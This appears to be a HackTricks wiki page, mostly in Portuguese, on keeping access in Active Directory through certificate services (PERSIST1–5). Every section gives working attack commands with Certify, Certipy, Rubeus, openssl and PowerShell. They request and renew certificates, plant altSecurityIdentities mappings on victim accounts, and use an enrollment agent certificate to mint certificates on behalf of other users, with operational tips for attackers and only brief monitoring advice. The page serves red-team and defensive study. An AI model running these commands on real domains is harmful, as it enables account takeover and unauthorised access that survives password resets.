# AD CS Persistência de Conta

{{#include ../../../banners/hacktricks-training.md}}

**Este é um pequeno resumo dos capítulos sobre persistência de conta da excelente pesquisa de [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)**

## Compreendendo o roubo de credenciais de usuários ativos com certificados – PERSIST1

Em um cenário onde um certificado que permite autenticação de domínio pode ser solicitado por um usuário, um atacante tem a oportunidade de solicitar e roubar esse certificado para manter persistência na rede. Por padrão, o modelo `User` no Active Directory permite esse tipo de solicitação, embora às vezes possa estar desabilitado.

Usando [Certify](https://github.com/GhostPack/Certify) ou [Certipy](https://github.com/ly4k/Certipy), você pode procurar modelos habilitados que permitem autenticação de cliente e então solicitar um:
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
O poder de um certificado reside na sua capacidade de autenticar-se como o usuário a quem pertence, independentemente de alterações de senha, enquanto o certificado permanecer válido.

Você pode converter PEM para PFX e usá-lo para obter um TGT:
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> Nota: Combinada com outras técnicas (veja as seções THEFT), a autenticação baseada em certificados permite acesso persistente sem tocar o LSASS e até mesmo a partir de contextos não-elevados.

## Obtendo Persistência de Máquina com Certificados - PERSIST2

Se um atacante tem privilégios elevados em um host, ele pode inscrever a conta de máquina do sistema comprometido para um certificado usando o template padrão `Machine`. Autenticar-se como a máquina habilita S4U2Self para serviços locais e pode fornecer persistência durável no host:
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local/theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## Estendendo Persistência Através da Renovação de Certificados - PERSIST3

Abusar dos períodos de validade e renovação dos templates de certificado permite que um atacante mantenha acesso de longo prazo. Se você possuir um certificado previamente emitido e sua chave privada, pode renová-lo antes da expiração para obter uma credencial nova e de longa duração sem deixar artefatos adicionais de solicitação vinculados ao principal original.
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> Dica operacional: monitore os períodos de validade dos arquivos PFX em posse do atacante e renove-os antecipadamente. A renovação também pode fazer com que certificados atualizados incluam a moderna extensão de mapeamento SID, mantendo-os utilizáveis sob regras de mapeamento de DC mais rígidas (veja a próxima seção).

## Plantando mapeamentos explícitos de certificados (altSecurityIdentities) – PERSIST4

Se você puder gravar no atributo `altSecurityIdentities` de uma conta alvo, pode mapear explicitamente um certificado controlado pelo atacante para essa conta. Isso persiste através de alterações de senha e, ao usar formatos de mapeamento fortes, permanece funcional sob a aplicação moderna do DC.

Fluxo de alto nível:

1. Obtenha ou emita um certificado client-auth que você controle (por exemplo, solicite o template `User` como você mesmo).
2. Extraia um identificador forte do certificado (Issuer+Serial, SKI, or SHA1-PublicKey).
3. Adicione um mapeamento explícito no `altSecurityIdentities` do principal da vítima usando esse identificador.
4. Autentique-se com seu certificado; o DC o mapeia para a vítima via o mapeamento explícito.

Exemplo (PowerShell) usando um mapeamento forte Issuer+Serial:
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Em seguida, autentique-se com seu PFX. Certipy obterá um TGT diretamente:
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10

# If PKINIT is unavailable on the DC, reuse the same persisted cert via Schannel/LDAPS
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell
```
### Construindo mapeamentos fortes de `altSecurityIdentities`

Na prática, os mapeamentos **Issuer+Serial** e **SKI** são os formatos fortes mais fáceis de construir a partir de um certificado em posse do atacante. Isso é importante após **11 de fevereiro de 2025**, quando os DCs passam a usar **Full Enforcement** por padrão e mapeamentos fracos deixam de ser confiáveis.
```bash
# Extract issuer, serial and SKI from a cert/PFX
openssl pkcs12 -in attacker_user.pfx -clcerts -nokeys -out attacker_user.crt
openssl x509 -in attacker_user.crt -noout -issuer -serial -ext subjectKeyIdentifier
```

```powershell
# Example strong SKI mapping for a user or computer object
$Map = 'X509:<SKI>9C4D7E8A1B2C3D4E5F60718293A4B5C6D7E8F901'
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
# Set-ADComputer -Identity 'WS01$' -Add @{altSecurityIdentities=$Map}
```
Notas
- Use strong mapping types only: `X509IssuerSerialNumber`, `X509SKI`, or `X509SHA1PublicKey`. Weak formats (Subject/Issuer, Subject-only, RFC822 email) are deprecated and can be blocked by DC policy.
- O mapeamento funciona tanto em objetos **user** quanto **computer**, então acesso de gravação ao atributo `altSecurityIdentities` de uma conta de computador é suficiente para persistir como essa máquina.
- A cadeia de certificados deve construir até uma raiz confiável pelo DC. Enterprise CAs em NTAuth são tipicamente confiáveis; alguns ambientes também confiam em CAs públicas.
- A autenticação Schannel continua útil para persistência mesmo quando PKINIT falha porque o DC não possui o Smart Card Logon EKU ou retorna `KDC_ERR_PADATA_TYPE_NOSUPP`.

Para mais sobre mapeamentos explícitos fracos e caminhos de ataque, veja:


{{#ref}}
domain-escalation.md
{{#endref}}

## Enrollment Agent as Persistence – PERSIST5

If you obtain a valid Certificate Request Agent/Enrollment Agent certificate, you can mint new logon-capable certificates on behalf of users at will and keep the agent PFX offline as a persistence token. Abuse workflow:
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
A revogação do certificado do agente ou das permissões do template é necessária para evictar essa persistência.

Notas operacionais
- Versões modernas do `Certipy` suportam tanto `-on-behalf-of` quanto `-renew`, então um atacante que possua um Enrollment Agent PFX pode emitir e depois renovar leaf certificates sem precisar tocar novamente na conta alvo original.
- Se a obtenção do TGT baseada em PKINIT não for possível, o certificado on-behalf-of resultante ainda pode ser usado para autenticação Schannel com `certipy auth -pfx victim_onbo.pfx -dc-ip 10.0.0.10 -ldap-shell`.

## 2025 Strong Certificate Mapping Enforcement: Impacto na Persistência

Microsoft KB5014754 introduziu Strong Certificate Mapping Enforcement em domain controllers. Desde 11 de fevereiro de 2025, os DCs padrão para Full Enforcement, rejeitando mapeamentos fracos/ambíguos. Implicações práticas:

- Certificados pré-2022 que não possuem a extensão de mapeamento SID podem falhar no mapeamento implícito quando os DCs estiverem em Full Enforcement. Atacantes podem manter acesso renovando certificados via AD CS (para obter a extensão SID) ou plantando um mapeamento explícito forte em `altSecurityIdentities` (PERSIST4).
- Mapeamentos explícitos usando formatos fortes (Issuer+Serial, SKI, SHA1-PublicKey) continuam funcionando. Formatos fracos (Issuer/Subject, Subject-only, RFC822) podem ser bloqueados e devem ser evitados para persistência.

Administradores devem monitorar e alertar sobre:
- Alterações em `altSecurityIdentities` e emissões/renovações de Enrollment Agent e User certificates.
- CA issuance logs para on-behalf-of requests e padrões de renovação incomuns.

## Referências

- Microsoft. KB5014754: Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings).
https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- SpecterOps. ADCS ESC14 Abuse Technique (explicit `altSecurityIdentities` abuse on user/computer objects).
https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/
- Certipy Wiki – Command Reference (`req -renew`, `auth`, `shadow`).
https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
- Almond Offensive Security. Authenticating with certificates when PKINIT is not supported.
https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html

{{#include ../../../banners/hacktricks-training.md}}
